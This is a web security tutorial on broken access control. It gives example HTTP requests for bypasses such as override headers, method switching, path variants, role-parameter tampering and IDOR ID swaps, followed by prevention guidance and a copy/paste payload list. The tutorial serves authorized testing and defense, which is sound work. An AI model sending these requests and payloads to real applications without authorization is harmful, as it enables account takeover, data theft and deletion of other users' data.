# Access control vulnerabilities and privilege escalation

Access control decides what an authenticated user is allowed to do, and broken access control is one of the most common ways attackers read, modify, or delete data they shouldn’t. This usually shows up as **privilege escalation** (gaining more power) or object-level access issues (accessing other users’ stuff).

> Only test applications you own or are explicitly authorized to assess.

## Access control types (what you’re trying to break)

- Vertical access control: restricts *functions* by role (user vs admin vs manager).  
- Horizontal access control: restricts *resources* by ownership (your invoice vs someone else’s invoice).  
- Context-dependent access control: restricts actions based on workflow/state (e.g., “can’t change cart after payment”).

In practice you should assume every endpoint needs both:
- Authentication (who are you?)
- Authorization (are you allowed to do this *right now*, to *this object*, using *this method*?)

## Common broken access control patterns (with exploit-style examples)

### 1) Unprotected admin functionality (direct URL access)
Classic: admin links aren’t shown to normal users, but the URL itself isn’t protected server-side.

```http
GET /admin HTTP/1.1
Host: target.tld
Cookie: session=...
```

What to test:
- Try common admin paths: `/admin`, `/administrator`, `/admin-panel`, `/manage`, `/console`.
- Check “hidden” paths leaked via `/robots.txt`, JS bundles, or sitemaps.
- Don’t trust “security by obscurity” URLs—if the server doesn’t enforce role checks, the URL being “random” doesn’t matter.

### 2) “Security by obscurity” admin URLs leaked in client-side JavaScript
Even if the admin URL is not guessable, it can leak to all users via static JS.

Example anti-pattern:
```html
<script>
  var isAdmin = false;
  if (isAdmin) {
    window.location = "/administrator-panel-yb556";
  }
</script>
```

What to test:
- Search JS for: `admin`, `isAdmin`, `role`, `administrator`, `panel`, `manage`, `deleteUser`.
- Request the discovered endpoint directly and confirm server-side enforcement.

### 3) Parameter-based access control (role stored in user-controllable data)
If the app stores role in a cookie, hidden field, or query param, it’s usually game over.

Bad patterns:
```http
GET /login/home?admin=true HTTP/1.1
```

```http
GET /login/home?role=1 HTTP/1.1
```

```http
Cookie: role=admin
```

```html
<input type="hidden" name="role" value="user">
```

What to test:
- Change role-like values: `user -> admin`, `0 -> 1`, `false -> true`.
- Look for “role” fields in profile update endpoints:
```http
POST /my-account/change-details
Content-Type: application/x-www-form-urlencoded

email=a@b.com&role=admin
```

Correct design:
- Role/permissions must come from a server-side source of truth (session store / DB / signed token with strict validation), not client-controlled fields.

### 4) Platform / proxy misconfiguration (URL override headers)
Some stacks let a header override the effective route, which can bypass URL-based restrictions at the front door.

Example bypass pattern:
```http
POST / HTTP/1.1
Host: target.tld
X-Original-URL: /admin/deleteUser
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

username=carlos
```

Also check:
```http
X-Rewrite-URL: /admin/deleteUser
X-Forwarded-Uri: /admin/deleteUser
X-Forwarded-Path: /admin/deleteUser
```

What to test:
- If `/admin/deleteUser` is blocked, try hitting `/` (or another allowed path) while setting override headers.
- Compare responses carefully (status code, body, side effects).

### 5) Method-based bypass (GET does what only POST should)
Front-end controls often restrict `POST /admin/deleteUser`, but the back-end might accept `GET` too.

```http
GET /admin/deleteUser?username=carlos HTTP/1.1
Host: target.tld
Cookie: session=...
```

Also try:
- `PUT`, `PATCH`, `DELETE`, `HEAD`
- Method override patterns:
```http
POST /admin/deleteUser HTTP/1.1
X-HTTP-Method-Override: DELETE
```

### 6) URL-matching discrepancies (case, suffixes, slashes)
Authorization checks and routing may disagree on what counts as the “same” path.

Try variations:
```text
/admin/deleteUser
/ADMIN/DELETEUSER
/admin/deleteUser/
/admin/deleteUser;/
/admin/deleteUser.anything
/admin/%2e%2e/admin/deleteUser
```

What to look for:
- A path that routes to the protected handler but is not covered by the access-control rule.

### 7) Horizontal privilege escalation (IDOR)
If you can change an object identifier and access another user’s resource, that’s a horizontal access control failure.

Query param example:
```http
GET /myaccount?id=123 HTTP/1.1
Cookie: session=...
```

Path param example:
```http
GET /users/123/profile HTTP/1.1
Cookie: session=...
```

JSON body example:
```http
POST /api/invoices/view
Content-Type: application/json
Cookie: session=...

{"invoiceId": 123}
```

What to test:
- Increment/decrement numeric IDs: `123 -> 124`.
- Swap UUIDs if you can learn them elsewhere (messages, reviews, filenames, API responses).
- Test every object type: invoices, orders, messages, addresses, tickets, documents.

Correct control:
- Always authorize based on *ownership/relationship*, not just “is logged in”.

### 8) Data leakage in redirects (still leaking on 302/401)
Sometimes the app “blocks” with a redirect to login, but the response body already contains sensitive data.

Check:
- The body of `302` responses.
- Cached responses in intermediate proxies.
- API responses that include data before failing an auth check.

### 9) Horizontal → vertical escalation (target a privileged account)
A horizontal bug becomes vertical when the “other user” is an admin or can perform admin-only actions.

Attack path patterns:
- Access an admin’s profile via IDOR and steal API keys.
- Trigger password reset flows for another user.
- Modify another user’s email/2FA settings if ownership checks are weak.

### 10) Multi-step process gaps (missing authZ on one step)
Apps often secure step 1 and 2 but forget step 3 (the “confirm/submit” endpoint).

Example flow:
1) `GET /admin/user/123/edit` (protected)
2) `POST /admin/user/123/edit` (protected)
3) `POST /admin/user/123/confirm` (missing check)

Exploit idea: call step 3 directly.
```http
POST /admin/user/123/confirm HTTP/1.1
Cookie: session=lowpriv
Content-Type: application/x-www-form-urlencoded

email=attacker@tld&role=admin
```

Fix:
- Enforce authorization at **every** step, and validate the workflow state server-side.

### 11) Referer-based access control (trusting a client header)
If access is allowed just because `Referer` looks like `/admin`, that’s bypassable because the header is attacker-controlled.

```http
POST /admin/deleteUser HTTP/1.1
Host: target.tld
Cookie: session=lowpriv
Referer: https://target.tld/admin
Content-Type: application/x-www-form-urlencoded

username=carlos
```

### 12) Location-based access control (geo restrictions)
Geo-based controls can often be bypassed via VPN/proxy or client-side location manipulation if the server doesn’t verify robustly.

Tests:
- Access from different egress IPs.
- Look for “trusted” headers like `X-Forwarded-For` being blindly accepted.

## How to test systematically (a repeatable checklist)

### 1) Build an “authorization matrix”
List:
- Roles (anon, user, manager, admin)
- Resources (orders, invoices, users, admin actions)
- Actions (read/create/update/delete/export)

Then verify each (role, resource, action) combination.

### 2) Test every endpoint, not every page
Access control is about requests. For each sensitive action:
- Repeat the request as a lower-priv user.
- Repeat with a different object ID (owned by another user).
- Repeat with method variations.

### 3) Prefer object-level testing everywhere
Even if an endpoint is “admin-only”, still test object-level rules:
- Can Admin A access Admin B’s secrets?
- Can Support read all users’ data, or only assigned tickets?

### 4) Validate “deny by default”
Try:
- Unknown endpoints close to real ones.
- Alternate paths and suffixes.
- Missing required parameters (sometimes “falls back” to a default object).

## Prevention (defense-in-depth that works)

### Core principles
- Deny by default: everything is forbidden unless explicitly allowed.
- Centralize authorization: one mechanism applied consistently across the app.
- Validate permissions on every request: no “we checked earlier in the workflow”.
- Never trust client-side enforcement: UI hiding is not security.

### Implementation patterns (examples)

#### 1) Server-side policy checks (pseudo-code)
```text
authorize(user, action, resource):
  if user is null: deny
  if not policy.allows(user, action, resource): deny
  allow
```

Object-level check example:
```text
GET /invoices/{invoiceId}
invoice = db.get(invoiceId)
if invoice.ownerId != currentUser.id and not currentUser.hasRole("ADMIN"):
  return 403
return invoice
```

#### 2) Use ABAC/ReBAC concepts for “real” rules
Instead of only RBAC (“admin vs user”), include attributes/relationships:
- Owner of resource
- Same tenant/org
- Time-of-day, location, device trust (when required)
- “Created-by” relationship

Example policy idea:
```text
Allow "refund" if user.role in {FINANCE} AND invoice.tenant == user.tenant AND invoice.state == "PAID"
```

#### 3) Secure static resources too
Don’t assume “static” equals “public”. If documents are sensitive:
- Serve via an authenticated controller that checks authorization.
- Use time-limited signed URLs only after authorization.

#### 4) Handle authorization failures safely
- Return 403 (or a generic 404 if you intentionally hide existence).
- Don’t include sensitive data in error bodies or redirects.
- Don’t “partially execute” an action before failing.

#### 5) Logging and detection (make exploitation visible)
Log:
- Authorization denials (who, what endpoint, what object).
- High-rate ID changes (IDOR probing).
- Access to admin endpoints by non-admin roles.
- Method override/header override attempts.

## Quick tester payload set (copy/paste)

Path variants:
```text
/admin
/admin/
/ADMIN
/admin;/
/admin/deleteUser
/admin/deleteUser/
/admin/deleteUser.anything
```

Header overrides:
```text
X-Original-URL: /admin/deleteUser
X-Rewrite-URL: /admin/deleteUser
X-HTTP-Method-Override: DELETE
Referer: https://target.tld/admin
```

IDOR swaps:
```text
?id=123 -> ?id=124
/users/123 -> /users/124
{"invoiceId":123} -> {"invoiceId":124}
```
